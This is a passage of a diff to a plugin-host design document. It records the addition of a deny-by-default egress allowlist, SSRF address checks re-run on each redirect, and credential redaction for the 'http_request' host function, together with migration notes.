+display-only preview — so a target that passes review is exactly the target permitted at runtime.
+
+If a URL property is also marked `x-secret` (credentials in userinfo), derivation still works because
+GZAC holds the plaintext server-side at push time; the origin is redacted in the UI and logs, and an
+entry carrying credentials is rejected rather than normalised.
+
+**Migration.** This is a breaking change to the grant model: existing configurations get an empty
+allowlist and therefore make no outbound calls until GZAC pushes one. In-tree the blast radius is a
+single manifest line for the `case-summary` sample (which hardcodes
+`https://jsonplaceholder.typicode.com/todos/1`); internal POC plugins need auditing for undeclared
+destinations. The window for landing this cheaply closes at V1.
 
 ### 18.7 Capability: `kv` ✅
 
@@ -2440,8 +2700,10 @@ plugin has one pre-existing TS error in the submit handler unrelated to capabili
 - `host-functions/log.ts` (new) — `log` host function with capability gate, writes to pino +
   persists to `plugin_logs` (async, non-blocking).
 - `host-functions/http-request.ts` (new) — `http_request` host function with capability gate,
-  HTTPS-only default (`HOST_ALLOW_HTTP=true` for dev), blocks calls to `gzacBaseUrl`, timeout
-  cap 60s, auto-logs to `plugin_logs`.
+  deny-by-default egress allowlist (`security/egress-allowlist.ts`), HTTPS-only default
+  (`HOST_ALLOW_HTTP=true` for dev), SSRF address envelope with the `HOST_ALLOWED_INTERNAL_CIDRS`
+  operator carve-out (`security/url-guard.ts`), blocks calls to `gzacBaseUrl`, timeout cap 60s,
+  auto-logs to `plugin_logs`. Every check re-runs on each redirect hop.
 - `plugin-manager.ts` — registers all 4 host functions on `createPlugin`, new constructor
   params (`configRepository`, `kvRepository`, `logRepository`, `allowHttp`), private
   `resolveCapabilities()` helper, threads `grantedCapabilities` through every `hostContext`.
